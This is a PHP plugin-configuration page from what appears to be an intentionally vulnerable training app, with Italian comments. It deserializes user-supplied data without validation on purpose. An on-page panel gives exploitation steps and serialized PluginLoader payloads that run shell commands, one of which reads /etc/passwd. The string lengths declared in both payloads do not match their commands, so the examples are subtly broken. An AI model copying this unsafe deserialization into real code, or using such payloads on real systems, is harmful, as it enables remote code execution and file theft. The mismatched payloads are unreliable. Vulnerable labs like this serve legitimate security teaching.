<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}
require_once 'db_connect.php';
require_once 'PluginLoader.php';
require_once 'header.php';

$page_title = 'Configura Plugin';

// VULNERABILITÀ CRITICA: Gestione configurazioni con deserializzazione non sicura
// Gli utenti possono modificare configurazioni serializzate che vengono poi deserializzate

$plugin_id = $_GET['id'] ?? null;

if (!$plugin_id) {
    header('Location: plugins.php');
    exit;
}

$stmt = $conn->prepare("SELECT * FROM plugins WHERE id = ?");
$stmt->execute([$plugin_id]);
$plugin = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$plugin) {
    die("Plugin non trovato");
}

// VULNERABILITÀ: Carica e deserializza configurazione senza validazione
$current_config = null;
if (!empty($plugin['config_data'])) {
    // VULNERABILITÀ CRITICA: Deserializza senza verifica
    $current_config = unserialize($plugin['config_data']);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_config'])) {
    $config_data = $_POST['config_data'] ?? '';
    
    // VULNERABILITÀ CRITICA: Salva configurazione serializzata senza validazione
    // Un attaccante potrebbe inserire dati serializzati malevoli che verranno eseguiti
    // quando il plugin viene installato o caricato
    
    // VULNERABILITÀ: Non verifica se i dati sono validi prima di salvarli
    $update_stmt = $conn->prepare("UPDATE plugins SET config_data = ? WHERE id = ?");
    $update_stmt->execute([$config_data, $plugin_id]);
    
    // VULNERABILITÀ: Deserializza immediatamente per "testare" (pericoloso!)
    $test_config = unserialize($config_data);
    
    $success = "Configurazione salvata!";
    
    // Ricarica plugin
    $stmt = $conn->prepare("SELECT * FROM plugins WHERE id = ?");
    $stmt->execute([$plugin_id]);
    $plugin = $stmt->fetch(PDO::FETCH_ASSOC);
    $current_config = unserialize($plugin['config_data']);
}
?>

<h1>Configura Plugin: <?php echo htmlspecialchars($plugin['name']); ?></h1>

<?php if (isset($success)): ?>
    <div class="alert alert-success"><?php echo htmlspecialchars($success); ?></div>
<?php endif; ?>

<div class="config-form">
    <form method="POST" action="">
        <div class="form-group">
            <label for="config_data">Configurazione (formato serializzato PHP)</label>
            <textarea id="config_data" name="config_data" rows="10" class="code-textarea" required><?php echo htmlspecialchars($plugin['config_data'] ?? ''); ?></textarea>
            <small>⚠️ VULNERABILITÀ CRITICA: I dati vengono deserializzati senza validazione. Puoi inserire oggetti serializzati malevoli!</small>
        </div>
        
        <button type="submit" name="save_config" class="btn">Salva Configurazione</button>
        <a href="plugins.php" class="btn btn-secondary">Annulla</a>
    </form>
</div>

<div class="config-preview" style="margin-top: 30px;">
    <h3>Anteprima Configurazione (deserializzata)</h3>
    <?php if ($current_config): ?>
        <pre style="background: #f5f5f5; padding: 15px; border-radius: 4px; overflow-x: auto;"><?php print_r($current_config); ?></pre>
    <?php else: ?>
        <p>Nessuna configurazione disponibile</p>
    <?php endif; ?>
</div>

<div class="vulnerability-warning" style="margin-top: 30px; padding: 15px; background: #fff3cd; border-left: 4px solid #ffc107; border-radius: 4px;">
    <h4>⚠️ VULNERABILITÀ CRITICA - Deserializzazione Non Sicura:</h4>
    <p><strong>Come sfruttare:</strong></p>
    <ol>
        <li>Inserisci un oggetto PluginLoader serializzato con comando arbitrario:</li>
        <pre style="background: #f5f5f5; padding: 10px; margin: 10px 0; border-radius: 4px;">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}</pre>
        <li>Salva la configurazione</li>
        <li>Quando il plugin viene installato o caricato, il comando verrà eseguito!</li>
    </ol>
    <p><strong>Esempio payload per RCE:</strong></p>
    <pre style="background: #f5f5f5; padding: 10px; margin: 10px 0; border-radius: 4px;">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:23:"cat /etc/passwd > /tmp/pw";}</pre>
</div>

<?php require_once 'footer.php'; ?>

